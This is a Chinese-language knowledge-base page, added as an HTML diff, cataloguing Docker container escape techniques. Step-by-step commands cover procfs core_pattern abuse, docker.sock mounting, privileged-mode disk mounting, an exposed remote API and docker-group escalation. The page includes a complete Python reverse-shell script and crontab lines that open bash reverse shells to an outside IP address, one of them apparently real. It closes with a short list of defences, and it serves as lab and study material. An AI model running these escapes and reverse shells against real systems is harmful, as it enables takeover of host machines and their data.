@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Docker逃逸手法大全 | My Hugo Knowledgebase</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+
+      <script src="/js/main.js"></script>
+
+
+</head>
+<body>
+  <header>
+    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
+    Theme
+  </button>
+</div>
+
+  </header>
+  <main>
+    
+  <h1>Docker逃逸手法大全</h1>
+
+  
+  
+  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>
+
+  <h1 id="docker逃逸手法大全">Docker逃逸手法大全</h1>
+<p>Docker相关安全风险更多集中在Docker逃逸方面</p>
+<p>和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件</p>
+<h2 id="判断是否为容器环境">判断是否为容器环境</h2>
+<p>在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：<a href="https://www.cnblogs.com/yuy0ung/articles/18220591">快速识别虚拟主机、Docker和K8s集群环境</a></p>
+<p>不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ls -al /.dockerenv
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331160431814.png" alt="image-20250331160431814"></p>
+<p>确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check</p>
+<h2 id="挂载宿主机procfs逃逸">挂载宿主机procfs逃逸</h2>
+<h3 id="基础概念">基础概念</h3>
+<p>procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件</p>
+<p>user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID</p>
+<p>而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：</p>
+<p>从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>创建容器并挂载/proc目录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
+</span></span></code></pre></div><p>搭建完毕</p>
+<h3 id="信息搜集">信息搜集</h3>
+<p>如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>find / -name core_pattern
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165144667.png" alt="image-20250331165144667"></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>找到当前容器在主机下的绝对路径：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /proc/mounts | xargs -d <span style="color:#e6db74">&#39;,&#39;</span> -n <span style="color:#ae81ff">1</span> | grep workdir
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165346849.png" alt="image-20250331165346849"></p>
+<p>可以看到绝对路径为<code>/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work</code></p>
+<p>接下来安装vim和gcc：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apt-get update -y <span style="color:#f92672">&amp;&amp;</span> apt-get install vim gcc -y
+</span></span></code></pre></div><p>然后创建一个python脚本用于反弹shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span>  os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xx.xx.xx.xx&#34;</span>
+</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span> <span style="color:#ae81ff">7777</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>   s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>   s<span style="color:#f92672">.</span>connect((lhost, lport))
+</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>putenv(<span style="color:#e6db74">&#34;HISTFILE&#34;</span>, <span style="color:#e6db74">&#39;/dev/null&#39;</span>)
+</span></span><span style="display:flex;"><span>   pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># os.remove(&#39;/tmp/.shell.py&#39;)</span>
+</span></span><span style="display:flex;"><span>   s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>   main()
+</span></span></code></pre></div><p>赋予执行权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> .shell.py
+</span></span></code></pre></div><p>将脚本写入到目标的proc目录下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;|/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/merged/tmp/.shell.py \rcore    &#34;</span> &gt;  /host/proc/sys/kernel/core_pattern
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331171439634.png" alt="image-20250331171439634"></p>
+<p>在攻击机上开启监听，接下来只需要让容器崩溃重启即可执行反弹shell脚本，使用程序实现：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)  {
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>a  <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">*</span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>gcc编译：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gcc .crash.c -o .crash
+</span></span></code></pre></div><p>执行编译后的程序使docker崩溃触发core dump，此时宿主机/proc/sys/kernel/core_pattern 中写入的.shell.py会被执行</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331173920827.png" alt="image-20250331173920827"></p>
+<p>成功监听到宿主机的反弹shell：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331174229302.png" alt="image-20250331174229302"></p>
+<p>至此，我们完成了一次挂载宿主机procfs逃逸</p>
+<h2 id="挂载docker-socket逃逸">挂载docker socket逃逸</h2>
+<h3 id="基础概念-1">基础概念</h3>
+<p>Docker Socket (/var/run/docker.sock) 是 Docker 守护进程（dockerd） 与 客户端（如 docker CLI、Docker API 调用） 之间的主要通信接口，即用来与守护进程通信即查询信息或者下发命令</p>
+<p>若容器挂载了<code>/var/run/docker.sock</code>，就相当于获得了 Docker CLI（命令行接口）的完全访问权限，通过 Docker API，可以在容器内部直接管理宿主机上的 Docker 进程，最终导致容器逃逸</p>
+<h3 id="环境搭建-1">环境搭建</h3>
+<p>创建容器并挂载<code>/var/run/docker.sock</code>文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
+</span></span></code></pre></div><p>进入容器并安装docker命令行客户端：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker exec -it with_docker_sock /bin/bash
+</span></span><span style="display:flex;"><span>apt-get update
+</span></span><span style="display:flex;"><span>apt-get install curl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#官网</span>
+</span></span><span style="display:flex;"><span>curl -fsSL https://get.docker.com/ | sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#阿里云镜像</span>
+</span></span><span style="display:flex;"><span>curl -fsSL https://get.docker.com -o install-docker.sh
+</span></span><span style="display:flex;"><span>sh install-docker.sh --mirror Aliyun
+</span></span></code></pre></div><p>至此，环境搭建完毕</p>
+<h3 id="信息搜集-1">信息搜集</h3>
+<p>直接检查是否存在<code>/var/run/docker.sock</code>文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ls -lah /var/run/docker.sock
+</span></span></code></pre></div><p>若文件存在，则可能存在该漏洞</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402151845586.png" alt="image-20250402151845586"></p>
+<h3 id="漏洞利用-1">漏洞利用</h3>
+<p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run -it -v /:/host ubuntu /bin/bash
+</span></span></code></pre></div><p>此时我们可以发现/host目录就是宿主机的根目录：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402153914370.png" alt="image-20250402153914370"></p>
+<p>那么只需要chroot将其变为根目录一下就完成了逃逸：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>chroot /host
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402154208382.png" alt="image-20250402154208382"></p>
+<h2 id="privileged特权模式逃逸">privileged特权模式逃逸</h2>
+<h3 id="基础知识">基础知识</h3>
+<p>当 Docker 容器以 <code>--privileged</code> 启动时，会获得以下权限：</p>
+<ul>
+<li><strong>完全设备访问权限</strong>：可访问宿主机所有设备（如 <code>/dev/sda</code>或<code>vda</code>、<code>/dev/tty</code> 等）。</li>
+<li><strong>绕过 Linux Capabilities 限制</strong>：默认容器仅保留部分权限（如 <code>CAP_CHOWN</code>、<code>CAP_NET_BIND_SERVICE</code>），特权模式赋予容器 <strong>所有 Capabilities</strong>（包括 <code>CAP_SYS_ADMIN</code>）。</li>
+<li><strong>禁用安全隔离机制</strong>：包括 Seccomp、AppArmor/SELinux 的部分限制</li>
+</ul>
+<p>在这种情况下，就有可能将宿主机文件系统挂载到容器内部造成逃逸</p>
+<h3 id="环境搭建-2">环境搭建</h3>
+<p>首先有一个普通用户 yuy0ung 并且加入了 docker 组：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo useradd -m -s /bin/bash yuy0ung
+</span></span><span style="display:flex;"><span>sudo passwd yuy0ung
+</span></span><span style="display:flex;"><span>sudo usermod -aG docker yuy0ung
+</span></span><span style="display:flex;"><span>su - yuy0ung
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402162542136.png" alt="image-20250402162542136"></p>
+<p>在普通用户下使用<code>--privileged=true</code>创建一个容器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run --rm --privileged<span style="color:#f92672">=</span>true -it alpine
+</span></span></code></pre></div><p>至此环境搭建完毕</p>
+<h3 id="信息搜集-2">信息搜集</h3>
+<p>判断是否为特权模式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /proc/self/status | grep CapEff
+</span></span></code></pre></div><p>如果docker是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff:</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402163607483.png" alt="image-20250402163607483"></p>
+<p>可见容器确实是特权模式启动</p>
+<h3 id="漏洞利用-2">漏洞利用</h3>
+<h4 id="方法1">方法1</h4>
+<p>查看磁盘挂载设备：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>fdisk -l
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402163813610.png" alt="image-20250402163813610"></p>
+<p>可以看到有一个39.8G的磁盘<code>/dev/vda3</code>，这就是宿主机文件，将其挂载到/test目录:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdir /test <span style="color:#f92672">&amp;&amp;</span> mount /dev/vda3 /test
+</span></span></code></pre></div><p>此时已经成功挂载宿主机根目录：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402203050150.png" alt="image-20250402203050150"></p>
+<p>可以尝试读取任意文件：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402203332217.png" alt="image-20250402203332217"></p>
+<p>我们还可以尝试写定时任务来反弹shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;* * * * * root /bin/bash -c &#34;sh -i &gt;&amp; /dev/tcp/47.94.106.5/7777 0&gt;&amp;1&#34;&#39;</span> &gt;&gt; /test/etc/crontab
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224224679.png" alt="image-20250402224224679"></p>
+<p>成功监听到宿主机root权限的反弹shell：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224142981.png" alt="image-20250402224142981"></p>
+<p>至此，成功逃逸</p>
+<h4 id="方法2">方法2</h4>
+<p>和前面提到的方法类似，由于我们将宿主机根目录挂载到了<code>/test</code>，而我们的shell本身权限又是root，所以这里可以直接chroot将/test改为根目录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>chroot /test
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224808056.png" alt="image-20250402224808056"></p>
+<p>当然到这一步我们的方法不仅仅拘泥于我提到的，因为我们是高权限，所以也可以尝试在直接去添加新的root组用户并登录等操作</p>
+<h2 id="docker远程api未授权访问逃逸">docker远程API未授权访问逃逸</h2>
+<h3 id="基础知识-1">基础知识</h3>
+<p>docker remote api 可以执行 docker 命令，若配置错误将其暴露在公网，攻击者可通过远程调用 Docker API直接管理容器，进而导致逃逸getshell</p>
+<h3 id="环境搭建-3">环境搭建</h3>
+<p>将docker守护进程监听在0.0.0.0：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
+</span></span></code></pre></div><p>如果有防火墙记得开放2375端口</p>
+<h3 id="信息搜集-3">信息搜集</h3>
+<p>直接访问服务器2375端口：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408210911881.png" alt="image-20250408210911881"></p>
+<p>如果响应为上图这样既表明存在漏洞</p>
+<p>也可以使用我们的docker尝试远程调用该端口api：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker -H tcp://x.x.x.x:2375 images
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408211156682.png" alt="image-20250408211156682"></p>
+<p>可以看到我们成功调用该api并列出了该docker的镜像，即漏洞存在</p>
+<h3 id="漏洞利用-3">漏洞利用</h3>
+<p>在这种情况下，我们相当于可以任意控制目标服务器的docker了，那么我们可以新运行一个容器，挂载点设置为服务器的根目录挂载至/yuy0ung目录下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/yuy0ung nginx:latest /bin/bash
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408211828439.png" alt="image-20250408211828439"></p>
+<p>那么接下来的思路就和上面差不多了，chroot或者写一个定时任务即可实现逃逸：</p>
+<ul>
+<li>
+<p>chroot:</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408212104350.png" alt="image-20250408212104350"></p>
+</li>
+<li>
+<p>定时任务监听：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;* * * * * root /bin/bash -c &#34;sh -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/7777 0&gt;&amp;1&#34;&#39;</span> &gt;&gt; /yuy0ung/etc/crontab
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408213527317.png" alt="image-20250408213527317"></p>
+</li>
+</ul>
+<p>至此成功获取宿主机权限</p>
+<h2 id="内核漏洞逃逸">内核漏洞逃逸</h2>
+<p>就是宿主机的内核存在漏洞的情况下的一些利用，简单来说就是提权类的内核漏洞会很可能导致容器逃逸</p>
+<p>这些内核漏洞通常是一些CVE，以CVE-2016-5195（dirty cow）为例：</p>
+<p>和权限提升时的dirty利用方法差不太多，之所以能实现逃逸，是因为docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机，其他的利用细节不再赘述，可以参考我的这篇文章：<a href="https://www.cnblogs.com/yuy0ung/articles/18326546">linux提权-内核提权</a></p>
+<p>除了脏牛，还有很多内核漏洞导致的逃逸，这里列举一些就不细讲了：</p>
+<ul>
+<li>CVE-2019-16884</li>
+<li>CVE-2021-3493</li>
+<li>CVE-2021-22555</li>
+<li>CVE-2022-0492</li>
+<li>CVE-2022-0847</li>
+<li>CVE-2022-23222</li>
+</ul>
+<h2 id="docker用户组提权">docker用户组提权</h2>
+<p>该trick其实可以归类到liunx提权里面的，不过也涉及到了docker以及逃逸所以放到这里记录：</p>
+<h3 id="基础知识-2">基础知识</h3>
+<p>Docker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能运行</p>
+<p>Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，就相当于拥有了root 的访问权限</p>
+<h3 id="环境搭建-4">环境搭建</h3>
+<p>由于前面复现特权模式逃逸的时候，我们已经创建了一个yuy0ung用户并加入了docker组，所以切换到该用户即可进行复现：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410181642354.png" alt="image-20250410181642354"></p>
+<h3 id="信息搜集-4">信息搜集</h3>
+<p>查看发现当前用户在docker组中：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410195542345.png" alt="image-20250410195542345"></p>
+<p>那么可以尝试docker用户组提权</p>
+<h3 id="漏洞利用-4">漏洞利用</h3>
+<p>这里直接拉取一个针对上面情况的提权镜像，大致原理就是拉取镜像时将宿主机根目录挂载进docker，而docker启动后自动执行启动脚本chroot逃逸出来了，详细内容可以参考镜像的github：https://github.com/chrisfosterelli/dockerrootplease</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410200514449.png" alt="image-20250410200514449"></p>
+<p>可以看到直接就提升到root权限了，其实和前面的chroot逃逸差不多</p>
+<h2 id="针对docker逃逸的防御措施">针对docker逃逸的防御措施</h2>
+<p>针对上面提到的手段，可以有如下防御措施：</p>
+<ul>
+<li>即时更新docker</li>
+<li>docker使用capabilities时需要遵循最小特权原则</li>
+<li>尽量在启动容器时使用&ndash;user选项指定容器以非特权用户身份运行</li>
+<li>不要直接挂载主机文件，尽量使用数据卷或共享文件系统</li>
+<li>将容器中的root用户映射为宿主机中的普通用户</li>
+<li>不要在容器中挂载docker socket，也不要将docker api配置到公网</li>
+</ul>
+<p>参考链接：https://wiki.teamssix.com/CloudNative/</p>
+
+  
+
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
